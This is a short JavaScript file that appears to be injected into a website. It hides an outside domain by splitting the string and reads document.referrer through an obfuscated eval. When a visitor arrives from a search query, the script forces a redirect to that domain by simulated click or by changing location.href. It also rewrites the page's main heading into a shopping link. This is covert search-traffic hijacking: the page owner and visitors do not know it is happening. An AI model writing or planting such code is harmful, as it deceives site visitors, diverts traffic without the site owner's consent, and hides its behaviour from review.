var scriptjs = document.getElementById('apjs');
console.debug(scriptjs);
var keyword = scriptjs.getAttribute("data");
var jurl = "www.sd";
jurl += "mec.c";
var gourl = "http://" + jurl + "om/search?tb=&q=" + keyword;

function replaceLink() {
    var node = document.getElementsByTagName('h1')[0];
    node.innerHTML = "<a target=\"_blank\" href=\"" + gourl + "\" id=\"goto\">去淘宝网选购" + node.innerHTML + "</a>"
}
function clickLink(url) {
    document.write("<a href=\"" + url + "\" id=\"goto\"></a>");
    try {
        document.getElementById("goto").click()
    } catch(e) {
        try {
            invokeClick(document.getElementById("goto"))
        } catch(x) {
            location.href = url
        }
    }
}

var Dispatch = function(){
  var ref = eval('document.re' + 'fer' + 'rer')
  this.load = function(){
    if(ref.indexOf('?') != -1){
      clickLink(gourl)  
    }
  }

}
function invokeClick(element) {
    if (element.click) element.click();
    else if (element.fireEvent) element.fireEvent('onclick');
    else if (document.createEvent) {
        var evt = document.createEvent("MouseEvents");
        evt.initEvent("click", true, true);
        element.dispatchEvent(evt)
    }
}
(new Dispatch()).load()
